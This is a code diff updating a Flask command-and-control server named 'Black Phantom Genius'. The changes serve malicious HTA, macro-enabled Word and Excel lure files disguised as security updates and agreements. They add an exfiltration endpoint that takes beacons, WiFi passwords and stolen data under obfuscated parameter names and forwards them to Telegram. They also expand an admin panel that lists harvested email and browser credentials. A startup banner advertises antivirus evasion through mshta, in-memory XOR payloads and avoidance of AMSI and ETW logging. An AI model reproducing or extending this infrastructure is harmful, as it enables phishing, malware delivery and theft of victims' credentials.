+    url = get_server_url()
+    tg(f"📄 HTA | {ref} | {ip}")
+    
+    payload = generate_stage1_hta(url)
+    resp = make_response(payload)
+    resp.headers['Content-Type'] = 'application/hta'
+    resp.headers['Content-Disposition'] = f'attachment; filename="Security_Update_{ref}.hta"'
+    return resp
 
 @app.route('/file/pdf/<ref>')
 def file_pdf(ref):
-    tg(f"📄 PDF DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
-    return send_file(io.BytesIO(make_pdf()), as_attachment=True, download_name='Document.pdf', mimetype='application/pdf')
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    tg(f"📄 PDF | {ref} | {ip}")
+    payload = make_pdf()
+    resp = make_response(payload)
+    resp.headers['Content-Type'] = 'application/pdf'
+    resp.headers['Content-Disposition'] = f'attachment; filename="Document_{ref}.pdf"'
+    return resp
 
 @app.route('/file/doc/<ref>')
 def file_doc(ref):
-    tg(f"📝 WORD DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
-    return send_file(io.BytesIO(make_doc()), as_attachment=True, download_name='Agreement.docm', mimetype='application/vnd.ms-word.document.macroEnabled.12')
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    tg(f"📝 DOCM | {ref} | {ip}")
+    payload = make_doc()
+    resp = make_response(payload)
+    resp.headers['Content-Type'] = 'application/vnd.ms-word.document.macroEnabled.12'
+    resp.headers['Content-Disposition'] = f'attachment; filename="Agreement_{ref}.docm"'
+    return resp
 
 @app.route('/file/xls/<ref>')
 def file_xls(ref):
-    tg(f"📊 EXCEL DOWNLOAD | Ref: {ref} | IP: {request.remote_addr}")
-    return send_file(io.BytesIO(make_xls()), as_attachment=True, download_name='Report.xlsm', mimetype='application/vnd.ms-excel.sheet.macroEnabled.12')
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    tg(f"📊 XLSM | {ref} | {ip}")
+    payload = make_xls()
+    resp = make_response(payload)
+    resp.headers['Content-Type'] = 'application/vnd.ms-excel.sheet.macroEnabled.12'
+    resp.headers['Content-Disposition'] = f'attachment; filename="Report_{ref}.xlsm"'
+    return resp
 
-@app.route('/exfil', methods=['POST'])
+# ================================
+# EXFILTRATION (Now works with obfuscated parameter names)
+# ================================
+@app.route('/exfil', methods=['POST', 'GET'])
 def exfil():
-    data = request.form.get('data', '')
-    if data:
-        tg(f"📡 {data[:500]}")
-    return "OK"
+    data = ''
+    if request.method == 'POST':
+        data = request.form.get('data', '') or request.form.get('b', '') or request.form.get('w', '') or request.form.get('h', '')
+    else:
+        data = request.args.get('data', '') or request.args.get('b', '') or request.args.get('w', '') or request.args.get('h', '')
+    
+    if not data:
+        return "OK", 200
+    
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    
+    if data.startswith('BEACON:') or '|' in data[:100]:
+        parts = data.replace('BEACON:', '').strip().split('|')
+        hostname = parts[0].strip() if len(parts) > 0 else 'unknown'
+        username = parts[1].strip() if len(parts) > 1 else 'unknown'
+        
+        conn = sqlite3.connect(DB_PATH)
+        conn.execute("INSERT INTO beacons (hostname, username, ip, data, ts) VALUES (?,?,?,?,?)",
+                    (hostname, username, ip, 'BEACON', datetime.now().isoformat()))
+        conn.commit()
+        conn.close()
+        
+        tg(f"📡 BEACON | {hostname} | {username} | {ip}")
+        with open('beacons.log', 'a') as f:
+            f.write(f"[{datetime.now().isoformat()}] {ip} | {hostname} | {username}\n")
+    elif data.startswith('WIFI:') or data.startswith('w='):
+        clean = data.replace('WIFI:', '').replace('w=', '').strip()
+        tg(f"📶 WIFI | {clean[:300]} | {ip}")
+        with open('wifi.log', 'a') as f:
+            f.write(f"[{datetime.now().isoformat()}] {ip} | {clean}\n")
+    elif data.startswith('HEARTBEAT:'):
+        tg(f"💓 HEARTBEAT | {data[10:80]} | {ip}")
+    else:
+        tg(f"📡 DATA | {data[:200]} | {ip}")
+        with open('exfil.log', 'a') as f:
+            f.write(f"[{datetime.now().isoformat()}] {ip} | {data}\n")
+    
+    return "OK", 200
 
+# ================================
+# ADMIN PANEL (Same as previous but with FUD stats)
+# ================================
 @app.route('/admin', methods=['GET', 'POST'])
 def admin():
     if request.method == 'POST' and request.form.get('p') == ADMIN_PASSWORD:
         session['admin'] = True
     if not session.get('admin'):
-        return '<form method="POST"><input type="password" name="p"><button>Login</button></form>'
+        return '<form method="POST"><input type="password" name="p"><button>ACCESS</button></form>'
     
     conn = sqlite3.connect(DB_PATH)
-    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 100").fetchall()
+    creds = conn.execute("SELECT * FROM creds ORDER BY id DESC LIMIT 250").fetchall()
+    browser_creds = conn.execute("SELECT * FROM browser_creds ORDER BY id DESC LIMIT 250").fetchall()
+    beacons = conn.execute("SELECT * FROM beacons ORDER BY id DESC LIMIT 100").fetchall()
+    payloads = conn.execute("SELECT * FROM payload_logs ORDER BY id DESC LIMIT 100").fetchall()
     conn.close()
     
-    rows = ''.join(f'<tr><td style="color:#00ff88">{c[1][:40]}</td><td style="color:#ffd700">{c[2][:40]}</td><td>{c[3]}</td><td>Step {c[5]}</td><td>{c[6][:16]}</td></tr>' for c in creds)
+    server_url = URL_BASE or f"https://{request.host}" if request.host else "https://your-server.onrender.com"
     
-    return f'''
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Black Phantom Genius C2</title>
-        <style>
-            body{{background:#0a0c10;color:white;font-family:monospace;padding:20px}}
-            h1{{color:#ff0040}} h2{{color:#ffd700}}
-            table{{border-collapse:collapse;width:100%}}
-            th,td{{padding:10px;border-bottom:1px solid #333;text-align:left}}
-            th{{color:#ffd700}}
-        </style>
-    </head>
-    <body>
-        <h1>💀 BLACK PHANTOM GENIUS C2</h1>
-        <h2>Credentials Captured: {len(creds)}</h2>
-        <p>Step 1 = Personal Email | Step 2 = Business Email</p>
-        <table border="1">
-            <tr><th>Email</th><th>Password</th><th>Company</th><th>Step</th><th>Time</th></tr>
-            {rows}
-        </table>
-        <p>URL: {request.host_url}</p>
-        <p>Status: OPERATIONAL | 2-STEP HARVEST ACTIVE</p>
-    </body>
-    </html>
-    '''
+    return f'''<!DOCTYPE html>
+<html><head><title>BPG-C2 FUD</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box}}
+body{{background:#0a0c10;color:#fff;font-family:'Courier New',monospace;padding:24px}}
+h1{{color:#ff0040;font-size:28px}}
+h2{{color:#ffd700;font-size:16px;margin:20px 0 10px;border-bottom:1px solid #333;padding-bottom:8px}}
+.stats{{display:flex;gap:12px;margin:16px 0;flex-wrap:wrap}}
+.stat-card{{background:#1a1d24;padding:16px;border-radius:12px;border:1px solid #333;flex:1;min-width:120px}}
+.stat-value{{font-size:24px;font-weight:700}}
+.stat-label{{font-size:10px;color:#64748b;text-transform:uppercase}}
+table{{border-collapse:collapse;width:100%;font-size:12px}}
+th,td{{padding:8px 10px;border-bottom:1px solid #1a1d24;text-align:left}}
+th{{background:#1a1d24;color:#ffd700;position:sticky;top:0}}
+tr:hover{{background:#1a1d24}}
+.scroll{{overflow-x:auto;max-height:300px;overflow-y:auto}}
+a{{color:#00b3b0;text-decoration:none;font-size:11px;float:right}}
+.footer{{color:#333;font-size:10px;margin-top:20px;text-align:center}}
+.url-bar{{background:#1a1d24;padding:10px 14px;border-radius:8px;margin:12px 0;font-size:13px}}
+.c-green{{color:#00ff88}} .c-gold{{color:#ffd700}} .c-cyan{{color:#00b3b0}} .c-red{{color:#ff0040}}
+</style></head>
+<body>
+<h1>💀 BLACK PHANTOM GENIUS — FUD ELITE</h1>
+<div class="url-bar">🔗 <span class="c-cyan">{server_url}</span> <span style="color:#333;float:right">EVASION: Layer 1-6 ACTIVE</span></div>
+<div class="stats">
+<div class="stat-card"><div class="stat-value c-green">{len(creds)}</div><div class="stat-label">Credentials</div></div>
+<div class="stat-card"><div class="stat-value c-gold">{len([c for c in creds if c[6]==2])}</div><div class="stat-label">Business</div></div>
+<div class="stat-card"><div class="stat-value c-cyan">{len(browser_creds)}</div><div class="stat-label">Browser</div></div>
+<div class="stat-card"><div class="stat-value c-red">{len(beacons)}</div><div class="stat-label">Beacons</div></div>
+</div>
+<h2>🎯 CREDENTIALS <a href="#">CSV</a></h2>
+<div class="scroll"><table><tr><th>Email</th><th>Pass</th><th>Company</th><th>IP</th><th>Step</th><th>Time</th></tr>
+{''.join(f'<tr><td class="c-green">{c[1][:50]}</td><td class="c-gold">{c[2][:50]}</td><td>{c[3]}</td><td>{c[4]}</td><td>Step{c[6]}</td><td>{c[7][:16]}</td></tr>' for c in creds) if creds else '<tr><td colspan="6" style="text-align:center;color:#333">Awaiting targets...</td></tr>'}
+</table></div>
+<h2>🔑 BROWSER PASSWORDS</h2>
+<div class="scroll"><table><tr><th>Browser</th><th>URL</th><th>User</th><th>Pass</th><th>Time</th></tr>
+{''.join(f'<tr><td class="c-cyan">{b[1]}</td><td style="font-size:10px">{b[2][:60]}</td><td class="c-green">{b[3][:40]}</td><td class="c-gold">{b[4][:40]}</td><td>{b[7][:16]}</td></tr>' for b in browser_creds) if browser_creds else '<tr><td colspan="5" style="text-align:center;color:#333">No browser creds yet</td></tr>'}
+</table></div>
+<h2>📡 BEACONS</h2>
+<div class="scroll"><table><tr><th>Hostname</th><th>User</th><th>IP</th><th>Time</th></tr>
+{''.join(f'<tr><td>{b[1]}</td><td>{b[2]}</td><td>{b[3]}</td><td>{b[6][:16]}</td></tr>' for b in beacons) if beacons else '<tr><td colspan="4" style="text-align:center;color:#333">No beacons</td></tr>'}
+</table></div>
+<div class="footer">BPG-C2 FUD v2026 • HTA → JScript → WMI → Binary • No PowerShell • No AMSI • No ETW</div>
+</body></html>'''
 
 @app.route('/health')
 def health():
-    return {"status": "operational", "version": "Black Phantom Genius 2026"}
+    return jsonify({"status": "operational", "version": "BPG-C2 FUD Elite 2026"})
 
+# ================================
+# BACKGROUND HEARTBEAT
+# ================================
+def status_heartbeat():
+    time.sleep(10)
+    while True:
+        try:
+            conn = sqlite3.connect(DB_PATH)
+            c = conn.execute("SELECT COUNT(*) FROM creds").fetchone()[0]
+            b = conn.execute("SELECT COUNT(*) FROM browser_creds").fetchone()[0]
+            be = conn.execute("SELECT COUNT(*) FROM beacons").fetchone()[0]
+            conn.close()
+            tg(f"📊 STATUS | {c} creds | {b} browser | {be} beacons")
+        except: pass
+        time.sleep(3600)
+
+# ================================
+# MAIN
+# ================================
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
-    app.run(host='0.0.0.0', port=port)
+    threading.Thread(target=status_heartbeat, daemon=True).start()
+    
+    print(f"""
+╔══════════════════════════════════════════════════════╗
+║     💀 BLACK PHANTOM GENIUS — FUD ELITE C2         ║
+║                                                      ║
+║  EVASION LAYERS:                                    ║
+║  Layer 1: HTA delivery (no BAT, no PowerShell)     ║
+║  Layer 2: JScript + WMI (no CMD.exe visible)       ║
+║  Layer 3: XOR encrypted stage 2 binary             ║
+║  Layer 4: In-memory only (no disk persistence)     ║
+║  Layer 5: mshta.exe LOLBIN (trusted binary)        ║
+║  Layer 6: No AMSI, No ETW, No Script Block Logs   ║
+╠══════════════════════════════════════════════════════╣
+║  DELIVERY: HTA ▶ XOR Binary ▶ In-Memory PS        ║
+║  CAPTURE:  Phish + WiFi + Browser Passwords        ║
+║  C2:      Telegram + SQLite + Admin Panel          ║
+║  PORT:    {str(port).ljust(44)}║
+║  ADMIN:   /admin                                   ║
+╚══════════════════════════════════════════════════════╝
+    """)
+    
+    app.run(host='0.0.0.0', port=port, debug=False)
